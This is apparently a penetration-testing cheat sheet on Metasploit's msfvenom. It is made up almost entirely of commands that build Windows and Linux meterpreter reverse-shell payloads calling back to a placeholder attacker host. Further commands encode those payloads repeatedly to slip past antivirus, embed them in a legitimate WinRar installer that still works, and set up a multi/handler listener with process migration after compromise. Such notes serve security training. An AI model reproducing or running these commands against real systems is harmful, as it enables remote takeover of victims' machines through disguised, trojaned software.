# MSFVenom

#### List out available payload

* "<mark style="color:yellow;">msfvenom --list payloads</mark>"

We will be focusing on the meterpreter payload.

### Difference between non staged and staged payloads

A non staged payload would be for example:

* "<mark style="color:yellow;">windows/x64/meterpreter\_reverse\_tcp</mark>"

While a staged payload would be:

* "<mark style="color:yellow;">windows/x64/meterpreter/reverse\_tcp</mark>"

The difference is in the name, showcasing the fact that a non-staged is sent together with the exploit.

### Generate a 32-bit Windows payload with Msfvenom

* "<mark style="color:yellow;">msfvenom -a x86 -p windows/meterpreter/reverse\_tcp LHOST=attackerIP LPORT=porttoconnectto -f exe > /home/kali/Desktop/'name</mark>'"
  * "<mark style="color:red;">-a</mark>": Target OS Architecture
  * "<mark style="color:red;">-p</mark>": Payload to use
  * "<mark style="color:red;">-f</mark>": Format of the payload

<mark style="color:purple;">NOTE:</mark> When outputting the payload, always specifiy the <mark style="color:red;">EXTENSION</mark> you gave it in the name of the file

### Generating a 64-bit payload

* "<mark style="color:yellow;">msfvenom -a x64 -p windows/x64/meterpreter/reverse\_tcp LHOST=attackerIP LPORT=porttoconnectto -f exe > /home/kali/Desktop/'name.ext</mark>'"

<mark style="color:purple;">NOTE:</mark> When outputting the payload, always specifiy the <mark style="color:red;">EXTENSION</mark> you gave it in the name of the file

### List Output format available

* "<mark style="color:yellow;">msfvenom --list formats</mark>"

### Generate Linux Payloads

* "<mark style="color:yellow;">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=attackerIP LPORT=connecto -f elf > 'locationandname</mark>'

To execute it give it executable permission with "<mark style="color:red;">chmod</mark>".

### Set the platform for the payload

* <mark style="color:yellow;">--platform</mark>

## Setting up a handler&#x20;

A handler is necessary to receive the reverse tcp connection from the target system

### Using msfconsole

* "<mark style="color:yellow;">use multi/handler</mark>"
* "<mark style="color:yellow;">set payload 'payload specified in msfvenom'</mark>"

<mark style="color:purple;">NOTE:</mark> The payload in the handler has to be the same as when creating the payload with msfvenom.

Set the LHOST and LPORT options

### List Encoders

* "<mark style="color:yellow;">msfvenom --list encoders</mark>"

### Generate an encoded Windows x86 payload

* "<mark style="color:yellow;">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -e x86/shikata\_ga\_nai -f exe > 'nameofpayload.extension'</mark>"

### Defining the number of iterations to encode

Add the "<mark style="color:red;">-i</mark>" flag and the number of iterations

Recommended is 10.

### Generate an encoded Linux x86 payload

* "<mark style="color:yellow;">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -i 10 -e x86/shikata\_ga\_nai -f elf > 'nameoffile.extension'</mark>"

Don't forget to setup the msf multi/Handler to receive the connection

WinRar is very good to inject payloads into.

### Generating and injecting the payload

&#x20;Download the WinRar 32-bit executable from the website

* "<mark style="color:yellow;">msfvenom -p /windows/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -e x86/shikata\_ga\_nai -i 10 -f exe -x 'specifywinrarexe > 'nameoffile.extension'</mark>"

#### Setting up the multi/handler

* "<mark style="color:yellow;">use multi/handler</mark>"

Set the payload to the same as the created payload

<mark style="color:purple;">NOTE:</mark> You can keep the original functionality of the used executable with the flag "<mark style="color:red;">-k</mark>".

After getting a meterpreter session in the target machine run the module <mark style="color:red;">post/windows/manage/migrate</mark>, to migrate to a more stable process.

* <mark style="color:yellow;">run post/windows/manage/migrate</mark>

### Maintaining the functionality of the portable executable

<mark style="color:yellow;">msfvenom -p /windows/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -e x86/shikata\_ga\_nai -i 10 -f exe -x -k 'specifywinrarexe > 'nameoffile.extension'</mark>

<mark style="color:purple;">NOTE:</mark> Most portable executables don't work with this flag







